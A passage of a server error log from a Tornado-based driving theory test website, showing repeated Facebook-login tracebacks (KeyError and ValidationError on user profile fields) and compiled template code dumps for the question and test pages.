    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 110.60ms
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 92, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['locale', 'gender', 'fb_id'])
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 73, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
